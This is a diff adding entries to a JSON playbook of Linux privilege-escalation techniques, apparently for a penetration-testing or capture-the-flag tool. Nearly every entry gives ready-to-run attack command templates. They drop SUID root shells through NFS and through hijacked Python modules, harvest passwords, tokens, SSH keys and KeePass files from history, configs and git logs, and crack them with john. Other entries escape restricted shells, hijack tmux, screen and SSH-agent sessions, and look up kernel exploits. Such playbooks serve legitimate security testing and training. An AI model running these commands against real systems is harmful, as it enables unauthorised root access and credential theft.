+        { "purpose": "On Kali: drop a root-owned SUID bash (use the target's own bash if glibc differs)", "template": "sudo cp /bin/bash /tmp/nfs/rootbash && sudo chmod +s /tmp/nfs/rootbash", "intent": "exploit" },
+        { "purpose": "On the target: run it", "template": "<path>/rootbash -p", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Kernel exploit lookup",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "Everything else failed and the kernel is old; kernel exploits can crash the box, try last.",
+      "tools": ["linux-exploit-suggester", "searchsploit"],
+      "commands": [
+        { "purpose": "Kernel release and build", "template": "uname -r; cat /proc/version", "intent": "enumerate" },
+        { "purpose": "DirtyCow (CVE-2016-5195, kernel before 4.8.3)", "template": "searchsploit dirty cow", "intent": "enumerate" },
+        { "purpose": "DirtyPipe (CVE-2022-0847, kernel 5.8 up to 5.16.11/5.15.25/5.10.102)", "template": "searchsploit dirty pipe", "intent": "enumerate" },
+        { "purpose": "Anything else for this version", "template": "searchsploit linux kernel <version>", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Vulnerable installed software",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "A SUID or root-run package is old (pkexec for PwnKit, screen 4.5.0, exim, polkit).",
+      "tools": ["searchsploit"],
+      "commands": [
+        { "purpose": "PwnKit (CVE-2021-4034): pkexec present and polkit unpatched", "template": "ls -la /usr/bin/pkexec; pkexec --version", "intent": "enumerate" },
+        { "purpose": "Installed versions on Debian/Ubuntu", "template": "dpkg -l | grep -iE '<software>'", "intent": "enumerate" },
+        { "purpose": "Installed versions on RHEL/CentOS", "template": "rpm -qa | grep -i '<software>'", "intent": "enumerate" },
+        { "purpose": "Look it up", "template": "searchsploit pwnkit", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Hunt credentials in history and environment",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["creds"],
+      "when": "Always early: people type passwords into shells and env files.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Every readable history file", "template": "find / -name '.*history' -readable 2>/dev/null -exec cat {} \\;", "intent": "dump" },
+        { "purpose": "Secrets in the environment", "template": "env | grep -iE 'pass|key|secret|token'", "intent": "dump" },
+        { "purpose": "Local mail", "template": "ls -la /var/mail /var/spool/mail; cat /var/mail/* 2>/dev/null", "intent": "dump" },
+        { "purpose": ".env and similar dotfiles", "template": "find / -name '.env' -readable 2>/dev/null -not -path '/proc/*'", "intent": "dump" }
+      ]
+    },
+    {
+      "name": "Hunt credentials in config files and webroots",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["creds"],
+      "when": "You landed as www-data or a service user: web and DB configs hold reusable passwords.",
+      "tools": ["grep"],
+      "commands": [
+        { "purpose": "Common config file names", "template": "find / \\( -name 'wp-config.php' -o -name 'config.php' -o -name 'settings.py' -o -name 'database.yml' -o -name '*.conf' -path '*www*' \\) -readable 2>/dev/null", "intent": "dump" },
+        { "purpose": "Git repos in webroots: secrets live in old commits", "template": "find / -name .git -type d 2>/dev/null", "intent": "dump" },
+        { "purpose": "Search a repo's history for passwords", "template": "git -C <path> log -p | grep -iE 'pass|secret|key'", "intent": "dump" },
+        { "purpose": "Tomcat and other app user files", "template": "find / -name 'tomcat-users.xml' -readable 2>/dev/null", "intent": "dump" }
+      ]
+    },
+    { "name": "Hunt SSH keys, backups and password vaults", "phase": "PrivEsc", "service": "shell", "applies": "linux", "needs": ["shell"], "yields": ["creds"], "when": "After configs: look for keys, archives and KeePass files you can read.", "tools": ["find"], "commands": [
+      { "purpose": "Readable private keys", "template": "find / \\( -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'id_ecdsa*' \\) -readable 2>/dev/null", "intent": "dump" },
+      { "purpose": "Trust files and VPN profiles: known_hosts names the next hosts", "template": "find / \\( -name authorized_keys -o -name known_hosts -o -name '*.ovpn' \\) -readable 2>/dev/null", "intent": "dump" },
+      { "purpose": "Backups and archives", "template": "find / \\( -name '*.bak' -o -name '*.old' -o -name '*backup*' -o -name '*.zip' -o -name '*.tar.gz' \\) -readable 2>/dev/null | grep -vE '^/(proc|usr/share|usr/lib)'", "intent": "dump" },
+      { "purpose": "KeePass databases", "template": "find / -name '*.kdbx' 2>/dev/null", "intent": "dump" },
+      { "purpose": "On Kali: crackable hash from a kdbx", "template": "keepass2john <file> > kdbx.hash && john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash", "intent": "authenticate" },
+      { "purpose": "On Kali: crack an encrypted SSH key passphrase", "template": "ssh2john id_rsa > id_rsa.hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash", "intent": "authenticate" }
+    ] },
+    {
+      "name": "Password reuse and switching users",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell", "creds"], "yields": ["shell", "admin"],
+      "when": "You found any password or key: try it for every real user and for root.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Switch user with the found password (needs a TTY)", "template": "su <user>", "intent": "authenticate" },
+        { "purpose": "Try it for root too", "template": "su root", "intent": "authenticate" },
+        { "purpose": "With a password, sudo -l often shows more", "template": "sudo -l", "intent": "enumerate" },
+        { "purpose": "On Kali: SSH with a found key", "template": "chmod 600 id_rsa && ssh -i id_rsa <user>@{{TARGET}}", "intent": "authenticate" }
+      ]
+    },
+    {
+      "name": "Escape a restricted shell",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["shell"],
+      "when": "Commands fail with 'restricted' or cd and / in commands are blocked (rbash, lshell).",
+      "tools": ["GTFOBins"],
+      "commands": [
+        { "purpose": "Confirm the shell and what PATH allows", "template": "echo $SHELL; echo $PATH; ls $PATH", "intent": "enumerate" },
+        { "purpose": "From vi/vim: type :set shell=/bin/bash then :shell", "template": "vi", "intent": "exploit" },
+        { "purpose": "Via an allowed interpreter", "template": "awk 'BEGIN {system(\"/bin/bash\")}'", "intent": "exploit" },
+        { "purpose": "On Kali: skip the login profile over SSH", "template": "ssh <user>@{{TARGET}} -t 'bash --noprofile'", "intent": "exploit" },
+        { "purpose": "Once out, fix PATH", "template": "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "intent": "tune" }
+      ]
+    },
+    {
+      "name": "Python library hijacking",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "A root/sudo Python script imports a module you can write, or from a dir you can write.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Module search order (script dir first)", "template": "python3 -c 'import sys; print(\"\\n\".join(sys.path))'", "intent": "enumerate" },
+        { "purpose": "Is the imported module writable?", "template": "find / -name '<module>.py' -writable 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "Append a SUID-bash dropper to it", "template": "echo 'import os; os.system(\"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\")' >> <file>", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Logrotate race (logrotten)",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "Root rotates a log in a directory you can write and logrotate is 3.18.0 or older.",
+      "tools": ["pspy"],
+      "commands": [
+        { "purpose": "logrotate version", "template": "logrotate --version", "intent": "enumerate" },
+        { "purpose": "Which logs get rotated and how", "template": "cat /etc/logrotate.conf; ls -la /etc/logrotate.d/", "intent": "enumerate" },
+        { "purpose": "Logs you can write", "template": "find / -name '*.log' -writable 2>/dev/null | grep -v '^/proc'", "intent": "enumerate" },
+        { "purpose": "Exploit to look up (whotwagner/logrotten on GitHub)", "template": "searchsploit logrotate", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Webapp or Tomcat running as root",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "A Java app server or local web admin runs as root; a code exec there is root.",
+      "tools": ["ss"],
+      "commands": [
+        { "purpose": "Which app servers run and as whom", "template": "ps aux | grep -iE 'tomcat|java|node|gunicorn|php-fpm'", "intent": "enumerate" },
+        { "purpose": "Manager creds for a WAR upload (WAR deploy is in Initial Access)", "template": "find / -name 'tomcat-users.xml' -readable 2>/dev/null -exec grep -i password {} \\;", "intent": "dump" },
+        { "purpose": "Can you write into its webroot or webapps dir?", "template": "ls -la <path>", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Hijack another user's screen or tmux session",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["shell", "admin"],
+      "when": "ps shows root or another user in screen/tmux with a socket you can reach.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Running sessions", "template": "ps aux | grep -E 'screen|tmux'", "intent": "enumerate" },
+        { "purpose": "tmux sockets and their permissions", "template": "ls -la /tmp/tmux-*/ 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "Attach to a writable tmux socket", "template": "tmux -S <path> attach", "intent": "exploit" },
+        { "purpose": "screen sessions and attach to one", "template": "screen -ls; screen -x <user>/<session>", "intent": "exploit" },
+        { "purpose": "SUID screen 4.5.0 is its own local root", "template": "screen -v; searchsploit screen 4.5.0", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "SSH agent hijacking",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["shell"],
+      "when": "Another user is logged in with agent forwarding and you can read their agent socket.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Find agent sockets", "template": "find /tmp -path '*ssh-*' -name 'agent.*' 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "List keys the agent holds", "template": "SSH_AUTH_SOCK=<path> ssh-add -l", "intent": "enumerate" },
+        { "purpose": "Use them to log in elsewhere as that user", "template": "SSH_AUTH_SOCK=<path> ssh <user>@<host>", "intent": "authenticate" }
+      ]
+    }
+  ]
+}
